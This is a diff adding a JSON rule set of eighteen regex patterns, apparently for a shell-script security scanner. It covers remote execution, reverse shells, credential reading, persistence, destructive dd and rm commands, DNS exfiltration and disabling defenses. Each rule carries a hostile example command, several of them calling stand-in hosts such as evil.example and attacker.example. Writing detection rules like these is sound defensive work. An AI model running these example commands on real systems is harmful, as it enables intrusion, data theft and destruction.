@@ -1,1 +1,192 @@
-[]
+[
+  {
+    "id": "SH001",
+    "name": "curl-wget-pipe-to-shell",
+    "regex": "\\b(curl|wget|fetch)\\b[^|\\n]*\\|\\s*(bash|sh|zsh|python3?|node|ruby|perl|php)\\b",
+    "severity": "CRITICAL",
+    "category": "remote-execution",
+    "description": "Piping HTTP download output directly into an interpreter executes untrusted remote code",
+    "example": "curl https://evil.example/setup.sh | bash",
+    "references": ["https://owasp.org/www-community/attacks/Command_Injection"]
+  },
+  {
+    "id": "SH002",
+    "name": "rm-rf-sensitive-path",
+    "regex": "\\brm\\s+-[a-zA-Z]*[rfRF]+[a-zA-Z]*\\s+(\\$HOME|~/|\\$\\()",
+    "severity": "CRITICAL",
+    "category": "destructive",
+    "description": "Recursive forced deletion targeting home directory or command substitution",
+    "example": "rm -rf $HOME/.config/",
+    "references": []
+  },
+  {
+    "id": "SH003",
+    "name": "chmod-world-writable",
+    "regex": "\\bchmod\\s+(-R\\s+)?0?777\\b",
+    "severity": "WARNING",
+    "category": "insecure-permissions",
+    "description": "chmod 777 grants world-writable permissions",
+    "example": "chmod 777 /var/www",
+    "references": []
+  },
+  {
+    "id": "SH004",
+    "name": "eval-variable-expansion",
+    "regex": "\\beval\\s+[\"']?\\$(?!\\()[A-Za-z_{]",
+    "severity": "CRITICAL",
+    "category": "code-injection",
+    "description": "eval with direct variable expansion can execute arbitrary input",
+    "example": "eval \"$USER_INPUT\"",
+    "references": ["https://cwe.mitre.org/data/definitions/95.html"]
+  },
+  {
+    "id": "SH005",
+    "name": "read-credential-files",
+    "regex": "\\b(cat|head|tail|less|more|strings)\\s+[^\\n]*(id_rsa|id_ecdsa|id_ed25519|\\.ssh/|credentials|private[_\\s-]?key|\\.pem\\b|\\.token\\b|\\.secret\\b)",
+    "severity": "CRITICAL",
+    "category": "credential-access",
+    "description": "Reading SSH keys, credential stores, or secret files",
+    "example": "cat ~/.ssh/id_rsa",
+    "references": []
+  },
+  {
+    "id": "SH006",
+    "name": "sudo-passwordless",
+    "regex": "\\bNOPASSWD\\b|echo\\s+[^|\\n]*\\|\\s*sudo\\s+-[Ss]\\b",
+    "severity": "WARNING",
+    "category": "privilege-escalation",
+    "description": "sudo with NOPASSWD sudoers rule or piped password bypasses interactive auth",
+    "example": "echo 'password' | sudo -S rm -rf /",
+    "references": []
+  },
+  {
+    "id": "SH007",
+    "name": "reverse-shell",
+    "regex": "/dev/(tcp|udp)/\\d|\\bnc\\s+(-\\w+\\s+)*-e\\s+/bin/(sh|bash)\\b|\\bmkfifo\\s+/tmp/[^\\n]*\\|\\s*(nc|sh|bash)\\b",
+    "severity": "CRITICAL",
+    "category": "remote-execution",
+    "description": "Reverse shell pattern establishing outbound connection for remote command execution",
+    "example": "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1",
+    "references": ["https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells"]
+  },
+  {
+    "id": "SH008",
+    "name": "write-env-to-dotfile",
+    "regex": ">>\\s*[\"']?[^\\s;&|]*(\\.bashrc|\\.zshrc|\\.bash_profile|\\.profile|authorized_keys|known_hosts|\\.env\\b|/\\.ssh/)",
+    "severity": "CRITICAL",
+    "category": "persistence",
+    "description": "Appending content to shell dotfiles or SSH authorization establishes persistence",
+    "example": "echo \"$TOKEN\" >> ~/.ssh/authorized_keys",
+    "references": []
+  },
+  {
+    "id": "SH009",
+    "name": "crontab-injection",
+    "regex": "\\|\\s*crontab\\b|\\bcrontab\\s*-\\s*<<|/etc/cron\\.(d|hourly|daily|weekly|monthly)\\b",
+    "severity": "WARNING",
+    "category": "persistence",
+    "description": "Piping data into crontab or writing to system cron directories",
+    "example": "echo '*/5 * * * * /tmp/beacon.sh' | crontab -",
+    "references": []
+  },
+  {
+    "id": "SH010",
+    "name": "dd-raw-device",
+    "regex": "\\bdd\\s+[^\\n]*\\bof\\s*=\\s*/dev/(sd[a-z]|nvme\\d|disk\\d|hd[a-z]|mmcblk\\d|xvd[a-z])\\b",
+    "severity": "CRITICAL",
+    "category": "destructive",
+    "description": "dd writing directly to a raw block device destroys data",
+    "example": "dd if=/dev/urandom of=/dev/sda",
+    "references": []
+  },
+  {
+    "id": "SH011",
+    "name": "base64-decode-pipe-exec",
+    "regex": "\\bbase64\\s+(-d|--decode|-D)\\b[^|\\n]*\\|\\s*(bash|sh|zsh|python3?|node|ruby|perl|php)\\b",
+    "severity": "CRITICAL",
+    "category": "obfuscation",
+    "description": "Decoding base64 and piping the result into an interpreter hides payloads",
+    "example": "echo 'cm0gLXJmIC8=' | base64 -d | bash",
+    "references": []
+  },
+  {
+    "id": "SH012",
+    "name": "shell-history-tamper",
+    "regex": "\\bunset\\s+HISTFILE\\b|\\bHISTFILE\\s*=\\s*[\"']?/?dev/null|\\bHISTSIZE\\s*=\\s*0\\b|\\bHISTFILESIZE\\s*=\\s*0\\b|\\bhistory\\s+-c\\b",
+    "severity": "CRITICAL",
+    "category": "anti-forensics",
+    "description": "Disabling or clearing shell history to evade forensic analysis",
+    "example": "unset HISTFILE",
+    "references": []
+  },
+  {
+    "id": "SH013",
+    "name": "python-os-system",
+    "regex": "\\bos\\.system\\s*\\(|\\bsubprocess\\.(call|run|Popen|check_call|check_output)\\s*\\([^)]*\\bshell\\s*=\\s*True\\b",
+    "severity": "CRITICAL",
+    "category": "dangerous-execution",
+    "description": "Python subprocess call with shell=True or os.system() both invoke /bin/sh with unsanitized input",
+    "example": "subprocess.run(cmd, shell=True)",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/78.html"
+    ]
+  },
+  {
+    "id": "SH014",
+    "name": "npm-lifecycle-hook-shell",
+    "regex": "\"(preinstall|postinstall|install|prepublish|prepare)\"\\s*:\\s*\"[^\"]*(\\|\\s*(bash|sh)\\b|\\beval\\s|\\bnode\\s+-e\\b|\\bcurl\\s+[^|\"]*\\|\\s*(bash|sh))",
+    "severity": "WARNING",
+    "category": "supply-chain",
+    "description": "npm lifecycle hook (preinstall/postinstall/install) pipes remote content into a shell or evaluates code",
+    "example": "\"preinstall\": \"curl https://evil.example/x.sh | bash\"",
+    "references": [
+      "https://docs.npmjs.com/cli/v10/using-npm/scripts#npm-install"
+    ]
+  },
+  {
+    "id": "SH015",
+    "name": "dns-exfiltration",
+    "regex": "\\b(dig|nslookup|host|drill)\\s+[^\\n]*\\$\\{?[A-Za-z_][\\w]*\\}?\\.[a-z]",
+    "severity": "CRITICAL",
+    "category": "exfiltration",
+    "description": "DNS query with variable interpolation into a subdomain, a common exfiltration channel",
+    "example": "dig $SECRET.attacker.example",
+    "references": [
+      "https://attack.mitre.org/techniques/T1048/003/"
+    ]
+  },
+  {
+    "id": "SH016",
+    "name": "wget-to-tmp-and-exec",
+    "regex": "\\b(wget|curl)\\s+[^\\n]*-[oO]\\s+[\"']?/tmp/[^\\s\"']+[^\\n]*(&&|;|\\|\\|)\\s*(bash|sh|python3?|chmod\\s+\\+x\\s+/tmp)",
+    "severity": "CRITICAL",
+    "category": "dangerous-execution",
+    "description": "Download to /tmp followed by chained execution of the downloaded file",
+    "example": "wget -O /tmp/x.sh https://evil.example/x.sh && bash /tmp/x.sh",
+    "references": []
+  },
+  {
+    "id": "SH017",
+    "name": "firewall-disable",
+    "regex": "\\biptables\\s+(-F\\b|--flush\\b|-X\\b|--delete-chain\\b|-Z\\b|--zero\\b)|\\bip6tables\\s+(-F\\b|--flush\\b)|\\bufw\\s+(disable|--force\\s+reset)\\b|\\bsetenforce\\s+0\\b|\\bsystemctl\\s+(stop|disable)\\s+(firewalld|iptables|ufw)\\b",
+    "severity": "CRITICAL",
+    "category": "defense-evasion",
+    "description": "Disabling or flushing host firewall / mandatory access control",
+    "example": "iptables -F",
+    "references": [
+      "https://attack.mitre.org/techniques/T1562/004/"
+    ]
+  },
+  {
+    "id": "SH018",
+    "name": "pkill-security-tools",
+    "regex": "\\b(pkill|killall|pgrep)\\s+[^\\n]*(clamd|ossec|falcon|wazuh|defender|crowdstrike|cylance|sophos|mcafee|snort|auditd|sysdig|osquery|elastic-agent|splunkd)\\b",
+    "severity": "CRITICAL",
+    "category": "defense-evasion",
+    "description": "Killing common endpoint-security or auditing daemons",
+    "example": "pkill clamd",
+    "references": [
+      "https://attack.mitre.org/techniques/T1562/001/"
+    ]
+  }
+]
